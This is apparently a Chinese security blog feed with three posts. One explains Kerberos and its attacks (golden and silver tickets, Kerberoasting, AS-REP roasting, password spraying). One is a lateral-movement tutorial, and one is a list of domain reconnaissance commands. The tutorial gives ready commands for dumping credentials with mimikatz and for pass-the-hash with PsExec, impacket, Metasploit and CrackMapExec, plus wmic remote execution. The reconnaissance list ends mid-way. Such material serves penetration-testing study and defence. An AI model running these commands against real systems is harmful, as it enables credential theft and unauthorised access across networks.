Server)</font>：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT(票据授予票据)</p><p><font color=red>TGS(Ticket Granting ticket)</font>：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据(ticket)</p><p>Kerberos认证过程简化描述如下：</p><p>客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。<font color=red>所以整个流程可简化为两大步</font>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）客户端向KDC请求获取想要访问的目标服务的服务授予票据(Ticket)；</span><br><span class="line"></span><br><span class="line">（2）客户端拿着从KDC获取的服务授予票据(Ticket)访问相应的网络服务；</span><br></pre></td></tr></table></figure><p>简化认证流程图如下：</p><p><img src="https://pic.888888.al/i/2023/08/15/10jy4ac.png" alt="0"></p><h1 id="四、Kerberos认证流程"><a href="#四、Kerberos认证流程" class="headerlink" title="四、Kerberos认证流程"></a>四、Kerberos认证流程</h1><p>上面写了简化版的Kerberos认证流程，大致分为两步，虽然只有两步，但是其中还是存在一些问题的，就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 (1)KDC怎么知道你(客户端)就是真正的客户端？凭什么给你发放服务授予票据(Ticket)呢？</span><br><span class="line">2 (2)服务端怎么知道你带来的服务授予票据(ticket)就是一张真正的票据呢？</span><br></pre></td></tr></table></figure><p>到这里就需要我们细节性的描述一下整个Kerberos认证的过程了～</p><p>上面提到这个流程可以简化为两大步，但其实在第一步中共做了两件事，这两件事解决了上述问题中的问题1；然后第二步解决了问题2； 最终结束认证过程建立通信。</p><p>所以整个Kerberos认证流程可以细化为三个阶段也可以理解为三次通信！ 接下来从三个阶段三次通信的角度细说认证过程。</p><p>在具体描述整个认证流程之前，我们需要知道几个Kerberos认证的前提条件:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 Kerberos协议他是一个“限权”的认证协议，Kerberos中会自带一个数据库，这个数据库会由创建Kerberos的运维人员提前在库中添加好整个系统中拥有使用Kerberos认证权限的用户和网络服务。在后续的认证中也是根据数据库中是否存在该用户和服务来判断该对象是否能够通过认证服务的；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、 所有使用Kerberos协议的用户和网络服务，在他们添加进Kerberos系统中时，都会根据自己当前的密码(用户密码，人为对网络服务随机生成的密码)生成一把密钥存储在Kerberos数据库中，且Kerberos数据库也会同时保存用户的基本信息(例如: 用户名，用户IP地址等)和网络服务的基本信息(IP，Server Name)；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、 Kerberos中存在的三个角色，只要是发生了两两之间的通信，那么都需要先进行身份认证；</span><br></pre></td></tr></table></figure><h2 id="第一次通信"><a href="#第一次通信" class="headerlink" title="第一次通信"></a>第一次通信</h2><p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据(Ticket)。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端，过程如下：<br><img src="https://pic.888888.al/i/2023/08/15/10k253f.png" alt="1"><br>1、 客户端用户向KDC以明文的方式发起请求，该次请求中携带了自己的用户名、主机IP、和当前时间戳；</p><p>2、 KDC当中的AS(Authentication Server)接收请求(AS是KDC中专门用来认证客户端身份的认证服务器)后去Kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；</p><p>3、 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回给客户端，其中包含两部分内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 第一部分内容称为TGT，它叫做票据授予票据，客户端需要使用TGT去KDC中的TGS(票据授予中心)获取访问网络服务所需的Ticket(服务授予票据)，TGT中包含的内容有Kerberos数据库中存在的该客户端的Name、IP、当前时间戳、客户端即将访问的TGS的Name、TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2) 第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而中断认证流程。</span><br></pre></td></tr></table></figure><p>至此，第一次通信完成！！！</p><h2 id="第二次通信"><a href="#第二次通信" class="headerlink" title="第二次通信"></a>第二次通信</h2><p>此时的客户端收到了来自KDC(其实是AS)的响应，并获取到了其中的两部分内容。客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。</p><p>首先它会根据时间戳判断该时间戳与自己发送请求时的时间的差值是否大于5分钟，如果大于5分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，其次请求的目的是为了获取能够访问目标网络服务的服务授予票据(Ticket)。</p><p>在第二次通信请求中，客户端将携带三部分内容交给KDC中的TGS，第二次通信过程具体如下所述：</p><p><img src="https://pic.888888.al/i/2023/08/15/10kds19.png" alt="3"></p><p>客户端行为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名、IP、时间戳；</span><br><span class="line">2、 客户端将自己想要访问的Server服务以明文的方式发送给KDC；</span><br><span class="line">3、 客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</span><br></pre></td></tr></table></figure><p>TGS行为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 此时KDC中的TGS(票据授予服务器)收到了来自客户端的请求。它首先根据客户端明文传输过来的Server服务IP查看当前Kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，则继续接下来的认证。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、 TGS使用自己的密钥将TGT中的内容进行解密，此时它看到了经过AS认证过后并记录的用户信息，一把Session_Key即CT_SK，还有时间戳信息，他会根据时间戳判断此次通信是否真是可靠有无超出时延。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、 如果时延正常，则TGS会使用CK_SK对客户端的第一部分内容进行解密(使用CT_SK加密的客户端信息)，取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</span><br></pre></td></tr></table></figure><p>4、 此时KDC将返回响应给客户端，响应内容包括：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 第一部分：用于客户端访问网络服务使用Server密码加密的ST(Server Ticket)，其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK(Session Key)。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2) 第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</span><br></pre></td></tr></table></figure><p>至此，第二次通信完成！！！</p><h2 id="第三次通信"><a href="#第三次通信" class="headerlink" title="第三次通信"></a>第三次通信</h2><p>此时的客户端收到了来自KDC(TGS)的响应，并使用缓存在本地的CT_SK解密了第二部分内容(第一部分内容中的ST是由Server密码加密的，客户端无法解密)，检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。<br><img src="https://pic.888888.al/i/2023/08/15/10khesl.png" alt="4"></p><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 客户端使用CK_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST(服务授予票据)作为第二部分内容都发送给服务端。</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 服务器此时收到了来自客户端的请求，它会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时它将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过KDC认证的具有真实身份的客户端，是它可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份(其实服务端在通信的过程中还会使用数字证书证明自己身份)。</span><br></pre></td></tr></table></figure><p>至此，第三次通信完成。此时也代表着整个Kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以进行整个网络的通信了。</p><p>将以上内容进行总结概述就是：整个Kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session key，即它们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。这为整个Kerberos认证过程保证了较高的安全性。</p><h1 id="五、Kerberos认证图谱"><a href="#五、Kerberos认证图谱" class="headerlink" title="五、Kerberos认证图谱"></a>五、Kerberos认证图谱</h1><h2 id="Kerberos认证整体流程图"><a href="#Kerberos认证整体流程图" class="headerlink" title="Kerberos认证整体流程图"></a>Kerberos认证整体流程图</h2><p><img src="https://pic.888888.al/i/2023/08/15/10lkygj.png" alt="5"></p><h2 id="Kerberos认证时序图"><a href="#Kerberos认证时序图" class="headerlink" title="Kerberos认证时序图"></a>Kerberos认证时序图</h2><p><img src="https://pic.888888.al/i/2023/08/15/10lrt2n.png" alt="6"></p><h1 id="六、Kerberos攻击方式"><a href="#六、Kerberos攻击方式" class="headerlink" title="六、Kerberos攻击方式"></a>六、Kerberos攻击方式</h1><p><img src="https://pic.888888.al/i/2023/08/15/10lx162.png" alt="7"></p><h2 id="1、AS-REQ阶段-三种手法"><a href="#1、AS-REQ阶段-三种手法" class="headerlink" title="1、AS_REQ阶段(三种手法)"></a>1、AS_REQ阶段(三种手法)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 哈希传递攻击(Pass The Hash)</span><br><span class="line">在AS_REQ阶段，捕获用户的密码Hash来做身份验证，获取TGT，横向访问其他主机。</span><br><span class="line"></span><br><span class="line">//使用场景：内网渗透中要横向移动，但获取不到明文口令。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(2) 域用户名枚举</span><br><span class="line">AS_REQ的cname值，当域用户不存在时，返回包提示错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(3) 密码喷洒攻击(Password Sparying)</span><br><span class="line">并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破，是用固定的密码去跑用户名。</span><br></pre></td></tr></table></figure><p>域用户名枚举以及密码喷洒攻击和Web爆破原理类似，根据响应包返回码来判断是否爆破成功！如下图所示:<br><img src="https://pic.888888.al/i/2023/08/15/10ngm4v.png" alt="8"></p><h2 id="2、AS-REP阶段-两种手法"><a href="#2、AS-REP阶段-两种手法" class="headerlink" title="2、AS_REP阶段(两种手法)"></a>2、AS_REP阶段(两种手法)</h2><h3 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="(1) 黄金票据"></a>(1) 黄金票据</h3><p>针对黄金票据的攻击发生在这一阶段。因为TGT黄金票据是由krbtgt用户的Hash加密的，所以如果我们获取了这个Hash，就可以用Mimikatz伪造任意TGT(可自己制作一个TGT认购权证)。总共需要以下信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 要伪造的域用户(名称、Hash)，一般是域管理员;</span><br><span class="line">• 域名;</span><br><span class="line">• 域的SID;</span><br><span class="line">• krbtgt用户的Hash;</span><br></pre></td></tr></table></figure><p>黄金、白银票据主要为了维持权限，尤其是黄金票据，是后门的万能钥匙</p><p><strong>此类攻击方法被称为票据传递攻击(Pass The Ticket)</strong></p><h3 id="2-AS-REP-Roasting攻击"><a href="#2-AS-REP-Roasting攻击" class="headerlink" title="(2) AS_REP Roasting攻击"></a>(2) AS_REP Roasting攻击</h3><p>AS_REP阶段，最外层的enc-part是用用户密码Hash加密的。对于域用户，如果设置了选项 “Do not require Kerberos preauthentication” ,此时向域控器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户的Hash加密的Login Session Key，我们通过进行离线爆破就可以获得用户Hash)重新组合，能够拼接成 “Kerberos 5 AS_REP etype 23”(18200) 的格式，接下来可以使用hashcat对其破解。</p><h2 id="3、TGS-REQ-amp-TGS-REP阶段-五种手法"><a href="#3、TGS-REQ-amp-TGS-REP阶段-五种手法" class="headerlink" title="3、TGS_REQ&amp;TGS_REP阶段(五种手法)"></a>3、TGS_REQ&amp;TGS_REP阶段(五种手法)</h2><p><strong>TGS_REP阶段(两种手法)</strong></p><h3 id="1-Kerberoast攻击"><a href="#1-Kerberoast攻击" class="headerlink" title="(1) Kerberoast攻击"></a>(1) Kerberoast攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在TGS_REP阶段，由于enc-part是用服务密码Hash加密的，所以我们可以通过爆破获得服务的Hash。</span><br><span class="line">域上的任何经过身份验证的用户，只要TGT没问题，就能够从TGS处根据SPN请求ST，然后进行暴力破解。SPN格式：SERVICE/host.name。可以用Windows自带的SetSPN.exe查询SPN, 命令为setspn -Q */*。之后，可以用mimikatz指定服务目标、导出ST，用tgsrepcrack破解，相关工具有很多。</span><br></pre></td></tr></table></figure><h3 id="2-白银票据"><a href="#2-白银票据" class="headerlink" title="(2) 白银票据"></a>(2) 白银票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在TGS_REP阶段，TGS_REP里面的ticket的enc-part是使用服务的Hash进行加密的，如果我们拥有服务的Hash，就可以给我们自己签发任意用户的TGS票据，这个票据也称为白银票据。相较于黄金票据，白银票据使用要访问服务的Hash，而不是krbtgt的Hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票据只能访问特定服务。但是要注意一点的是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TGS生成的ST虽然只能访问特定的服务，但不依赖KDC，所以相比伪造黄金票据动静更小。ST用AP的Hash加密，如果获取了这个Hash，就可以伪造ST，进而跳过KDC的认证，直接和AP通信。</span><br></pre></td></tr></table></figure><p>总共需要以下信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户名称、Hash;</span><br><span class="line"></span><br><span class="line">域名;</span><br><span class="line"></span><br><span class="line">域的SID;</span><br><span class="line"></span><br><span class="line">目标AP的服务名、NTLM Hash等;</span><br></pre></td></tr></table></figure><p><strong>其实这也属于票据传递攻击！！!</strong></p><p>S4U阶段(三种手法)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">非约束委派攻击</span><br><span class="line">约束委派攻击</span><br><span class="line">基于资源的约束委派攻击</span><br></pre></td></tr></table></figure><h2 id="4、PAC阶段-MS14-068"><a href="#4、PAC阶段-MS14-068" class="headerlink" title="4、PAC阶段(MS14-068)"></a>4、PAC阶段(MS14-068)</h2><p>PAC介绍</p><p>在Kerberos最初设计的几个流程里说明了如何证明Client是Client而不是由其他人来冒充的但并没有声明Client有没有访问Server服务的权限因为在域中不同权限的用户能够访问的资源是有区别的。</p><p>所以Microsoft为了解决这个问题在实现Kerberos时加入了PAC的概念，PAC全称是(Privilege Attribute Certificate 特权属性证书)</p><p>PAC可以理解为一串校验信息为了防止被伪造和篡改原则上是存放在TGT里并且TGT由KDC Hash加密。同时尾部会有两个数字签名分别由KDC密码和Server密码加密防止数字签名内容被篡改。</p><h1 id="七、Kerberos词汇扩展"><a href="#七、Kerberos词汇扩展" class="headerlink" title="七、Kerberos词汇扩展"></a>七、Kerberos词汇扩展</h1><p><img src="https://pic.888888.al/i/2023/08/15/10s7gdk.png" alt="9"></p>]]></content>
      
      
      <categories>
          
          <category> Kerberos协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTH传递</title>
      <link href="/archives/a4ebb772.html"/>
      <url>/archives/a4ebb772.html</url>
      
        <content type="html"><![CDATA[<h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><h2 id="PTH-pass-the-hash-HASH传递"><a href="#PTH-pass-the-hash-HASH传递" class="headerlink" title="PTH(pass-the-hash)HASH传递"></a>PTH(pass-the-hash)HASH传递</h2><p>pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p><p>pass the hash 原理：</p><p>• 在 Windows 系统中，通常会使用 NTLM 身份认证</p><p>• NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)<br>• hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LMhash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 </p><p>• 如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用API 生成 hash 的过程)</p><p>这类攻击适用于：</p><p>• 域&#x2F;工作组环境</p><p>• 可以获得 hash，但是条件不允许对 hash 爆破</p><p>• 内网中存在和当前机器相同的密码</p><p>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The<br>Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号<br>仍可以进行 Pass The Hash 远程 ipc 连接。</p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使<br>用 mimikatz 还是可以攻击成功。</p><p>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。</p><h2 id="mimitkaz-pth"><a href="#mimitkaz-pth" class="headerlink" title="mimitkaz pth"></a>mimitkaz pth</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot;&gt; password.txt</span><br><span class="line">因为mimikatz不能粘贴复制，所以我们可以将执行结果导入倒txt文件中</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10tnr44.png" alt="0"></p><p>得到 hash 后进行</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">pth</span> /<span class="title">user:administrator</span> /<span class="title">domain:workgroup</span> /<span class="title">ntlm</span>:32<span class="title">ed87bdb5fdc</span></span></span><br><span class="line"><span class="function">5<span class="title">e9cba88547376818d4</span></span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10u15wj.png" alt="1"></p><p><strong>成功后 会弹出终端 cmd。</strong></p><h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。</p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。对方开放 445 端口，就相当于开放了 smb 协议</p><p>psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec64.exe /accepteula /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span> -u Administrator -p <span class="number">123456</span> <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><p>-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框</p><p>-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell</p><p>直接直接执行回显</p><p>-u 域\用户名</p><p>-p 密码</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec.exe /accepteula /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">141</span> -u Administrator -p <span class="number">123456</span> <span class="built_in">cmd</span> /c &quot;<span class="built_in">ipconfig</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10up4ov.png" alt="2"></p><p>查看是否开放445端口</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">445</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10utluq.png" alt="3"></p><p>上面是建立在明文之上 下面 hash 下进行登录</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">psexec -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba8854</span><br><span class="line"><span class="number">7376818</span>d4 ./Administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/16/z61h3r.png" alt="4"></p><p>出现这个错误可以使用 impacket 这个工具包下的 psexec 进行利用</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -hashes aa:<span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4 ./Administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10vf30k.png" alt="5"></p><p>在使用 PsExec 时需要注意以下几点：</p><p>• 需要远程系统开启 admin$ 共享（默认是开启的）</p><p>• 因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</p><p>• 在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</p><p>• 在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</p><p>• 使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是administrator 权限的 shell </p><p>• 在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</p><p>登陆域管理命令</p><p>impacket 下的 psexec</p><p>python3 psexec.py moonsec&#x2F;<a href="mailto:&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x34;&#50;">&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x34;&#50;</a></p><p>执行命令后输入密码</p><p>登陆其他主机管理员</p><p>psexec &#x2F;accepteula &#x2F;s \12server1 -u Administrator -p 123456 cmd</p><h2 id="使用-msf-hash-模块"><a href="#使用-msf-hash-模块" class="headerlink" title="使用 msf hash 模块"></a>使用 msf hash 模块</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> SMBUser Administrator</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">141</span></span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba885473</span><br><span class="line"><span class="number">76818</span>d4</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10vwrti.png" alt="6"></p><h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><p>CrackMapExec 可以对 C 段中的主机进行批量 pth,项目地址：</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p><p>使用命令：</p><p>crackmapexec smb 192.168.0.0&#x2F;24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4</p><p>对 192.168.9.0&#x2F;24 C 段进行批量 pass the hash<br><img src="https://pic.888888.al/i/2023/08/15/10wav3v.png" alt="7"></p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，<br>Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将<br>PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目<br>标主机 C 盘的 ip.txt 文件中</p><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口</p><p>( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10wh6gx.png" alt="8"><br>.</p><p>.</p><p>.</p><p>之后建立 IPC$ ，使用 type 读取执行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.0.123\ipc$ &quot;123456&quot; /user:administrator</span><br><span class="line">type \\192.168.0.123\c$\ip.txt</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10wlisi.png" alt="9"></p>]]></content>
      
      
      <categories>
          
          <category> 横向渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域信息收集命令</title>
      <link href="/archives/397dc553.html"/>
      <url>/archives/397dc553.html</url>
      
        <content type="html"><![CDATA[<h1 id="域信息收集命令"><a href="#域信息收集命令" class="headerlink" title="域信息收集命令"></a>域信息收集命令</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user 查看本机用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user /domain 查看域用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view &amp; <span class="built_in">net</span> group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二</span><br><span class="line">个查的更多</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view /domain 查看有几个域</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view \\\\dc 查看 dc 域内共享文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group /domain 查看域里面的组</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain 查看域管</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain /这个也是查域管，是升级为域控时，</span><br><span class="line">本地账户也成为域管</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain 域控</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> config workstation 当前登录域 - 计算机名 - 用户名</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个</span><br><span class="line">帐号登录域内主机，可访问资源</span><br><span class="line"></span><br><span class="line"><span class="built_in">ipconfig</span></span><br><span class="line"></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">nltest /dclist:xx 查看域控</span><br><span class="line"></span><br><span class="line">whoami /all 查看 Mandatory <span class="built_in">Label</span> uac 级别和 sid 号</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> sessoin 查看远程连接 session (需要管理权限)</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> share 共享目录</span><br><span class="line"></span><br><span class="line">cmdkey /l 查看保存登陆凭证</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%logonserver%</span> 